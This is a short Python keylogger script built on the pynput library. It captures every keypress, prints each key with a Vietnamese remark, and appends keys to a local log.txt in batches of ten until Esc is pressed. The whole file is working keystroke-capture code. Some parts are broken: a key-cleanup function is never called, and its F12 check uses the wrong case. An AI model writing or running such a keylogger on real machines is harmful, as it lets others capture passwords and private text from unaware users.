import pynput

from pynput.keyboard import Key, Listener
def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key == "key.f12":
        raise SystemExit(0)
    if key == "Key.ctrl_l":
        key = ""
    if key == "Key.enter":
        key = "\n"
    if key == "Key.alt_l":
        key = "\n"
    if key == "Key.tab":
        key = "\n"

count = 0
keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))

def on_press(key):
    global keys, count
    keys.append(key)
    count +=1
    print("{0} moi go xong".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
